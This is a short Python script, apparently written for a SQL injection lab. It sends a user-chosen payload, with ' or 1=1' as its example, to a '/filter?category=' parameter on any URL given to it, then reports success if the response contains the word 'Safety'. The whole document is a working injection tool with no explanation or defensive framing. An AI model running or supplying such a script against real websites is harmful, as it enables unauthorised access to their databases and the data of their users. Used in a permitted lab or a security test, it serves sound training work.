#this is the first script 
#problem statement is "SQL Injection vulnerability in parameter"

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


def exploit_sqli(url,payload):
    uri="/filter?category="
    r=requests.get(url + uri + payload, verify=False)
    if "Safety" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[+] Usage : {} <url> <payload>".format(sys.argv[0]))
        print('[+] Example -> {} www.example.com " or 1=1"'.format(sys.argv[0]))
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("SQL Injection Successfull")
    else:
        print("SQL Injection Unseccessfull")


